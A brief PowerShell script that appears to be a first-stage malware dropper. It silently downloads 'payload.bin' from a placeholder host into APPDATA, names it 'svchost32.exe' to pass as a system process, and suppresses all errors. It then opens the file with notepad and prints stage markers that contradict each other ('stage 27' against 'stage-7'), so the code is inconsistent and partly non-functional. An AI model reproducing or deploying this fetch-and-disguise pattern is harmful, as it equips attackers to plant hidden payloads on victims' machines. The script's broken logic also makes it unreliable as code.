
$Stage1Url = "http://example.net/downloads/payload.bin"
$PayloadPath = "$env:APPDATA\svchost32.exe"
Invoke-WebRequest -Uri $Stage1Url -OutFile $PayloadPath -UseBasicParsing -ErrorAction SilentlyContinue
Start-Process -FilePath "notepad.exe" -ArgumentList $PayloadPath -ErrorAction SilentlyContinue
Write-Output "stage 27 initialized"
$StageMarker = "stage-7"
